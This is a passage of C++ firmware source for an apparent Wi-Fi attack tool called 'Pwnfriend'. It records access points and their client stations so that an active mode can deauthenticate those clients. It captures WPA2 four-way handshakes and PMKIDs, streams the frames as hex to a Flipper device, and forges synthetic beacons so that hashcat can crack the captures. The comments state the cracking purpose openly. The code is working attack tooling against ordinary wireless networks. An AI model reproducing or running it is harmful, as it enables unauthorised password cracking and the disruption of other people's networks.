}

void Pwnfriend::streamFrameHex(const uint8_t* bssid, const uint8_t* frame, int length) {
    if (length <= 0) return;
    static const char* hexd = "0123456789abcdef";
    // "PWNFRIEND_HS " + 12 hex bssid + ' ' + 2*len frame hex + '\n'. Static (this
    // is only ever reached from the single rx-callback task, never the main loop)
    // so a large frame doesn't blow the callback's stack, and the whole line goes
    // out as ONE write so it can't interleave with the main loop's prints.
    static char line[800];
    const int PREFIX = 13;                          // "PWNFRIEND_HS "
    int max_bytes = (int)(sizeof(line) - PREFIX - 12 - 1 - 1) / 2;  // bssid+sp+nl
    if (length > max_bytes) length = max_bytes;     // truncate huge frames (ESSID
                                                    // sits near the front, so it
                                                    // survives for cracking)
    int p = 0;
    memcpy(line, "PWNFRIEND_HS ", PREFIX); p = PREFIX;
    for (int i = 0; i < 6; i++) {
        line[p++] = hexd[bssid[i] >> 4];
        line[p++] = hexd[bssid[i] & 0x0f];
    }
    line[p++] = ' ';
    for (int i = 0; i < length; i++) {
        line[p++] = hexd[frame[i] >> 4];
        line[p++] = hexd[frame[i] & 0x0f];
    }
    line[p++] = '\n';
    Serial.write((const uint8_t*)line, p);
}

void Pwnfriend::reportClient(const uint8_t* payload, int length) {
    // Harvest the client station from a DATA frame so active mode can unicast-deauth
    // it. Allocation-free (runs in the rx callback). The client is the non-BSSID
    // address per the DS bits; associate it to an AP we already recon'd.
    if (length < 24) return;
    if ((payload[0] & 0x0c) != 0x08) return;               // type == DATA only
    bool tods = payload[1] & 0x01, fromds = payload[1] & 0x02;
    const uint8_t *bssid, *client;
    if (fromds && !tods) { bssid = payload + 10; client = payload + 4; }   // AP->STA
    else if (tods && !fromds) { bssid = payload + 4; client = payload + 10; } // STA->AP
    else return;                                            // IBSS/WDS: ambiguous, skip
    if (client[0] & 0x01) return;                           // multicast/broadcast, not a STA
    int ai = reconIndex(bssid);
    if (ai < 0) return;                                     // only clients of known APs
    uint32_t now = millis();
    for (int i = 0; i < _n_sta; i++)
        if (memcmp(_sta[i].mac, client, 6) == 0) {
            _sta[i].ap_idx = (uint8_t)ai;                   // re-target if it roamed to another known AP
            _sta[i].last_seen = now;
            return;
        }
    int slot;
    bool append = (_n_sta < MAX_STA);
    if (append) {
        slot = _n_sta;
    } else {
        // Table full: evict the least-recently-seen client so newer/closer ones in
        // a dense area still get tracked (last_seen is load-bearing here).
        slot = 0;
        for (int i = 1; i < _n_sta; i++)
            if ((uint32_t)(now - _sta[i].last_seen) > (uint32_t)(now - _sta[slot].last_seen)) slot = i;
    }
    memcpy(_sta[slot].mac, client, 6);
    _sta[slot].ap_idx = (uint8_t)ai;
    _sta[slot].last_seen = now;
    // Publish the entry before the count so the main-loop reader can't see an
    // incremented _n_sta pointing at a half-written slot (rx-callback vs loop task).
    if (append) { __sync_synchronize(); _n_sta = slot + 1; }
}

void Pwnfriend::streamSyntheticBeacon(const uint8_t* bssid, const char* ssid) {
    if (!ssid || !ssid[0]) return;                         // unknown/hidden -> can't help
    int slen = (int)strlen(ssid);
    if (slen > 32) slen = 32;
    uint8_t b[110];
    int p = 0;
    static const uint8_t HEAD[] = {
        0x80, 0x00, 0x00, 0x00,                            // FC beacon, duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff                 // Addr1 broadcast
    };
    memcpy(b + p, HEAD, sizeof(HEAD)); p += sizeof(HEAD);
    memcpy(b + p, bssid, 6); p += 6;                       // Addr2 = BSSID
    memcpy(b + p, bssid, 6); p += 6;                       // Addr3 = BSSID
    b[p++] = 0x00; b[p++] = 0x00;                          // seq-ctl
    memset(b + p, 0, 8); p += 8;                           // timestamp
    b[p++] = 0x64; b[p++] = 0x00;                          // beacon interval
    b[p++] = 0x11; b[p++] = 0x00;                          // caps: ESS + Privacy
    b[p++] = 0x00; b[p++] = (uint8_t)slen;                 // SSID IE
    memcpy(b + p, ssid, slen); p += slen;
    static const uint8_t RATES[] = {0x01, 0x04, 0x82, 0x84, 0x8b, 0x96};
    memcpy(b + p, RATES, sizeof(RATES)); p += sizeof(RATES);
    static const uint8_t RSN[] = {                         // WPA2-PSK/CCMP, so 22000 sees AKM
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
        0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x0c, 0x00
    };
    memcpy(b + p, RSN, sizeof(RSN)); p += sizeof(RSN);
    streamFrameHex(bssid, b, p);
}

bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int channel,
                         bool has_fix, double lat, double lon) {
    if (length < 38 || payload[0] != 0x80) return false;   // beacon only
    const uint8_t* bssid = payload + 10;                    // Addr2 = BSSID (beacon)
    if (reconIndex(bssid) >= 0) return false;               // dedup
    if (_n_recon >= MAX_RECON) return false;                // table full

    // SSID IE (tag 0x00) is the first tagged param, at offset 36.
    char ssid[33] = {0};
    if (payload[36] == 0x00) {
        int slen = payload[37];
        if (slen > 32) slen = 32;
        if (38 + slen <= length) {
            char raw[33];
            for (int i = 0; i < slen; i++) raw[i] = (char)payload[38 + i];
            raw[slen] = '\0';
            sanitize(raw, ssid, sizeof(ssid));
        }
    }

    memcpy(_recon[_n_recon].bssid, bssid, 6);
    strncpy(_recon[_n_recon].ssid, ssid, sizeof(_recon[_n_recon].ssid) - 1);
    _recon[_n_recon].ssid[sizeof(_recon[_n_recon].ssid) - 1] = '\0';
    _recon[_n_recon].channel = (uint8_t)channel;
    _recon[_n_recon].rssi = (rssi < -128 || rssi > 0) ? 0 : (int8_t)rssi;  // first-seen, for targeting
    _recon[_n_recon].attacks = 0;
    _recon[_n_recon].missed = false;
    // Publish the entry before bumping the count (rx-callback writer vs loop reader).
    __sync_synchronize();
    _n_recon++;

    // Stream this first beacon to the Flipper so its per-BSSID pcap carries the
    // ESSID (a mandatory WPA 22000 field hcxpcapngtool/hashcat need to crack).
    streamFrameHex(bssid, payload, length);

    char mac[18];
    fmt_mac(mac, bssid);
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
    char line[256];
    int n = snprintf(line, sizeof(line),
        "PWNFRIEND_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,"
        "\"rssi\":%d%s}\n",
        mac, ssid, channel, rssi, geo);
    if (n < 0) return true;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
    return true;
}

bool Pwnfriend::reportHandshake(const uint8_t* payload, int length, int rssi, int channel,
                                bool has_fix, double lat, double lon) {
    // EAPOL ethertype 0x888e: after 802.11 hdr + LLC/SNAP at [30..31], or [32..33]
    // when a 2-byte QoS control is present (same test Marauder's eapol path uses).
    int eo;
    if (length > 31 && payload[30] == 0x88 && payload[31] == 0x8e) eo = 32;
    else if (length > 33 && payload[32] == 0x88 && payload[33] == 0x8e) eo = 34;
    else return false;                                   // not EAPOL

    // BSSID from the DS bits (FromDS/ToDS in FC byte 1). Derived up front so the
    // streamed frame is self-describing and the Flipper files it under the right
    // per-BSSID pcap (no dependence on a preceding PWND — protocol v2).
    bool tods   = payload[1] & 0x01;
    bool fromds = payload[1] & 0x02;
    const uint8_t* bssid;
    if (fromds && !tods)       bssid = payload + 10;     // AP->STA: Addr2
    else if (!fromds && tods)  bssid = payload + 4;      // STA->AP: Addr1
    else if (!fromds && !tods) bssid = payload + 16;     // IBSS:    Addr3
    else                       bssid = payload + 10;     // WDS: fallback Addr2

    streamFrameHex(bssid, payload, length);              // full EAPOL frame -> pcap

    if (eo + 6 >= length) return true;                   // EAPOL but truncated
    if (payload[eo + 1] != 0x03) return true;            // not EAPOL-Key; still save

    uint16_t key_info = (payload[eo + 5] << 8) | payload[eo + 6];
    bool key_ack = key_info & (1 << 7);
    bool key_mic = key_info & (1 << 8);
    bool secure  = key_info & (1 << 9);

    const char* type = nullptr;

    if (key_ack && !key_mic && !secure) {
        // M1 -- look for an RSN PMKID KDE in Key Data.
        int kdl_off = eo + 97;                           // Key Data Length (2)
        if (kdl_off + 1 < length) {
            int kdl = (payload[kdl_off] << 8) | payload[kdl_off + 1];
            int kd  = kdl_off + 2;                        // Key Data start
            int kd_end = kd + kdl;
            if (kd_end > length) kd_end = length;
            for (int i = kd; i + 22 <= kd_end; i++) {
                // DD <len> 00 0F AC 04 <16-byte PMKID>
                if (payload[i] == 0xDD &&
                    payload[i + 2] == 0x00 && payload[i + 3] == 0x0F &&
                    payload[i + 4] == 0xAC && payload[i + 5] == 0x04) {
                    bool nonzero = false;
                    for (int b = 0; b < 16; b++)
                        if (payload[i + 6 + b]) { nonzero = true; break; }
                    if (nonzero) type = "pmkid";
                    break;
                }
            }
        }
    } else if (!key_ack && key_mic && !secure) {
        type = "handshake";                              // M2: client replied
    }

    if (type && markPwnd(bssid)) {
        _epoch_pwnd = true;   // real activity this epoch -> keeps recon at full speed
        int ri = reconIndex(bssid);
        const char* ssid = (ri >= 0) ? _recon[ri].ssid : "";
        // Guarantee the ESSID is in this pcap: when we caught the EAPOL as DATA
        // frames and never kept the AP's real beacon, the capture is otherwise
        // uncrackable (this was most of the overnight run). No-op if SSID unknown.
        streamSyntheticBeacon(bssid, ssid);
        emitPwnd(bssid, ssid, type, channel, rssi, has_fix, lat, lon);
    }
    return true;                                         // EAPOL -> save to pcap
}
